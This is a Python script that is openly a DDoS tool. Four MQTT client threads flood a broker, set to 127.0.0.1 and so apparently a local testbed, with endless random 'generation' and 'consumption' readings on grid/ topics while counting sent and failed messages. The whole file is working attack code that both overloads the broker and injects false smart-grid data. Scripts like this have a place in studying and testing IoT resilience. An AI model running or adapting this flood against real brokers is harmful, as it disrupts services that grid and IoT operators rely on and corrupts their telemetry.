import paho.mqtt.client as mqtt
import random
import json
import time
import threading
import os
import signal
import sys

BROKER = "127.0.0.1"
PORT = 1883

sent_data_count = {}
failed_data_count = {}

def signal_handler(sig, frame):
    print("Stopping DDoS attack...")
    sys.exit(0)

def on_connect(client, userdata, flags, rc):
    client.connected_flag = True
    print(f"Attacker {userdata} connected.")

def publish_data(client, ClientId, name):
    global sent_data_count, failed_data_count
    sent_data_count[ClientId] = 0
    failed_data_count[ClientId] = 0

    while True:
        if client.connected_flag:
            generation = round(random.uniform(100.0, 500.0), 2)
            consumption = round(random.uniform(50.0, 300.0), 2)

            result_gen = client.publish(f"grid/{name}/generation", generation)
            result_con = client.publish(f"grid/{name}/consumption", consumption)

            if result_gen.rc == mqtt.MQTT_ERR_SUCCESS:
                sent_data_count[ClientId] += 1
            else:
                failed_data_count[ClientId] += 1

            if result_con.rc == mqtt.MQTT_ERR_SUCCESS:
                sent_data_count[ClientId] += 1
            else:
                failed_data_count[ClientId] += 1


def start_attacker(ClientId, name):
    client = mqtt.Client(userdata=ClientId)
    client.on_connect = on_connect
    client.connected_flag = False
    client.connect(BROKER, PORT, 60)
    client.loop_start()

    thread = threading.Thread(target=publish_data, args=(client, ClientId, name))
    thread.start()

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    attacker_name = "attacker"  # Base name to use for each attacker
    for i in range(1, 5):
        start_attacker(f"attacker_{i}", f"{attacker_name}_{i}")
    while True:
        time.sleep(1)
        os.system("cls" if os.name == "nt" else "clear")
        print(f"Data sent: {sent_data_count}")
        print(f"Data failed: {failed_data_count}")
